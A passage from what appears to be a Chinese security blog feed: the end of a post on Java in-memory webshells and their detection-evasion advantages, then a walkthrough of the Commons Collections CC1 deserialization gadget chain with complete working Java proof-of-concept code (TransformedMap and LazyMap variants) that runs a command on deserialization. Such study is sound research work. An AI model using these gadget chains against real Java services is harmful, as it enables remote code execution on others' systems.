JVM，获取数据</p><p><code>Agent型内存马</code>：通过Hook并修改关键方法添加恶意逻辑</p><blockquote><p>直到目前，Agent型内存马在两款炙手可热的webshell管理工具冰蝎和哥斯拉上都有实现。从落地Jar执行命令注入，到Self-attach，再到无文件落地的Agent注入，相关技术实现越来越精彩</p></blockquote><p>除了按照内存马的实现方式分类，还可以按照内存马的利用方式分为：冰蝎马、哥斯拉马、蚁剑马、命令回显马、流量隧道马等等。</p><h2 id="Java内存马的优劣势"><a href="#Java内存马的优劣势" class="headerlink" title="Java内存马的优劣势"></a>Java内存马的优劣势</h2><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ol><li>由于网络原因不能反弹 shell 的；</li><li>内部主机通过反向代理暴露 Web 端口的；</li><li>服务器上有防篡改、目录监控等防御措施，禁止文件写入的；</li><li>服务器上有其他监控手段，写马后会告警监控，人工响应的；</li><li>服务使用 Springboot 等框架，无法解析传统 Webshell 的；</li></ol><h3 id="劣势"><a href="#劣势" class="headerlink" title="劣势"></a>劣势</h3><ol><li>服务重启后会失效；</li><li>对于传统内存马，存在的位置相对固定，已经有相关的查杀技术可以检出</li></ol><h2 id="Java内存马类型选择"><a href="#Java内存马类型选择" class="headerlink" title="Java内存马类型选择"></a>Java内存马类型选择</h2><p>原生 Servlet-API内存马、新颖 WebSocket内存马、通用 Agent型内存马</p><p>最受欢迎的是Servlet-API 型和 Agent 型内存马</p><p>小众非主流内存马更容易过检测</p>]]></content>
    
    
    <summary type="html">初步认识Java内存马</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java利用链CommonCollections1分析</title>
    <link href="http://example.com/posts/954915702.html"/>
    <id>http://example.com/posts/954915702.html</id>
    <published>2024-01-06T07:29:10.000Z</published>
    <updated>2024-03-03T14:58:10.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java利用链CommonCollections1分析"><a href="#Java利用链CommonCollections1分析" class="headerlink" title="Java利用链CommonCollections1分析"></a>Java利用链CommonCollections1分析</h1><p>初始版本的CC1利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240106153823684.png" alt="image-20240106153823684"></p><p>逐步分析利用链，首先分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                    &#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>这是一个接口，声明了transform方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240106154207977.png" alt="image-20240106154207977"></p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>该类实现了Transformer接口，所以也实现了transform方法，该方法的内容是返回构造函数参数的对象</p><p>因为构造的参数是Runtime.getRuntime()所以最终返回的对象是Runtime类</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240106154505952.png" alt="image-20240106154505952"></p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer类同样主要看实现的transform方法</p><p>主要内容是判断参数是否为null，不为null并且没有其它异常则执行方法的调用</p><p>我们的构造参数为（”exec”, new Class[]{String.class},new Object[]{“calc”}）则会执行exec方法，参数为calc就是弹计算器的操作</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240106154834154.png" alt="image-20240106154834154"></p><p>再看第二条代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer中的transform方法为遍历构造函数参数的Transformer类数组，执行类的transform方法，transform的参数为上一个类transform方法返回的结果</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240108133755147.png" alt="image-20240108133755147"></p><p>我们传入的参数是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>根据前面对ConstantTransformer和InvokerTransformer的transform函数的分析，先执行ConstantTransformer的transorm函数返回Runtime类，再执行InvokerTransformer的transform函数参数为Runtime类，执行Runtime的exec方法弹出计算器</p><p>接下来看如何触发ChainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransormedMap底层也是继承了Map，是Map的装饰类，decorate方法</p><p>对Map进行装饰生成TransformedMap，因为构造方法为protected属性无法直接访问所以用decorate获得</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240108135106662.png" alt="image-20240108135106662"></p><p>再看TransormedMap的put函数</p><p>执行会触发transformKey和transformValue方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240108135423472.png" alt="image-20240108135423472"></p><p>现在看下这两个方法，如果值不为null，则触发transform方法，我们设置map的key或value为ChainedTransformer就能成功触发整个利用链</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240108135559308.png" alt="image-20240108135559308"></p><p>可是最终的结果是需要反序列化触发的，需要找到一个办法来替代之前通过put方法来手动触发的办法</p><p>找到的这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>因为需要反序列化触发，所以看AnnotationInvocationHandler的ReadObject方法</p><h3 id="在Jdk-8u71以前的版本"><a href="#在Jdk-8u71以前的版本" class="headerlink" title="在Jdk 8u71以前的版本"></a>在Jdk 8u71以前的版本</h3><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115103039599.png" alt="image-20240115103039599"></p><p>其中的meberValues就是我们传入的TransformedMap对象</p><p>然后进行遍历设值，在Map中有接口Entry&#x3D;&gt;setValue()会直接触发put操作，也就是触发TransformedMap的实现类ChainedTransformer的put，导致利用链执行</p><h3 id="在Jdk-8u71以后的版本的readObject方法"><a href="#在Jdk-8u71以后的版本的readObject方法" class="headerlink" title="在Jdk 8u71以后的版本的readObject方法"></a>在Jdk 8u71以后的版本的readObject方法</h3><p>会新建一个LinkedHashMap，所有的操作会在新的LinkedHashMap中进行，所以导致在Jdk 8u71以后的版本无法利用</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115105535814.png" alt="image-20240115105535814"></p><h2 id="利用TransformedMap的CC1利用链"><a href="#利用TransformedMap的CC1利用链" class="headerlink" title="利用TransformedMap的CC1利用链"></a>利用TransformedMap的CC1利用链</h2><p>在了解完所有类后完整的POC如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                    <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在之前创建Transformer中是直接使用Runtime.getRuntime获得的直接是Runtime类对象java.lang.Runtime</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是该类并没有实现java.io.Serializable所以不支持反序列化</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115121632798.png" alt="image-20240115121632798"></p><p>所以可以通过反射来获取到上下文中的Runtime对象，新的写法就为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>获取的是Runtime.class对象 是java.lang.Class对象</p><p>在之后的内容中触发序列化链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">      <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">      innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">      <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">      <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">      construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>因为在AnnotationInvocationHandler的readObject方法中需要满足不等于null才会继续执行</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115125319263.png" alt="image-20240115125319263"></p><p>而不满足null的条件是</p><ol><li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是A</li><li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为A的元素</li></ol><p>因此用到了Retention.class，该类中有value方法，该类原用于指定注解保留策略</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115125944093.png" alt="image-20240115125944093"></p><p>在之后进行序列化和反序列化成功弹出计算器，利用CC1链成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line">System.out.println(barr);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br></pre></td></tr></table></figure><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115130311130.png" alt="image-20240115130311130"></p><h2 id="ysoserial中利用LazyMap的CC1利用链"><a href="#ysoserial中利用LazyMap的CC1利用链" class="headerlink" title="ysoserial中利用LazyMap的CC1利用链"></a>ysoserial中利用LazyMap的CC1利用链</h2><p>在ysoserial中利用的是LazyMap</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115132617741.png" alt="image-20240115132617741"></p><p>看下LazyMap与TransformedMap一样都是来自Common-Collections库中的，继承AbstractMapDecorator。</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115132704437.png" alt="image-20240115132704437"></p><p>LazyMap是通过get方法进行触发的，LazyMap为懒加载在get不到值的时候调用factory.transform获取value值put到map里并返回value</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115134937850.png" alt="image-20240115134937850"></p><p>但是在AnnotationInvocationHandler的readObject方法中没有直接用到get方法，ysoserial利用了AnnotationInvocationHandler的invoke方法进行调用get</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115143423986.png" alt="image-20240115143423986"></p><p>因为AnnotationInvocationHandler实现InvocationHandler，通过jdk动态代理对该对象进行代理，在readObject反序列化时调用任意方法就会调用invoke方法，从而执行LazyMap的get方法</p><p>对AnnotationInvocationHandler进行Proxy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>因为最终利用链是需要通过readObject方法来进行触发的，所以readObject方法还是</p><p>入口点，当对象调用到readObject方法里面会调用porxyMap中的相关方法导致invoke触发，所以还要再包裹一层进行传入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><p>最终的POC如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1C</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span 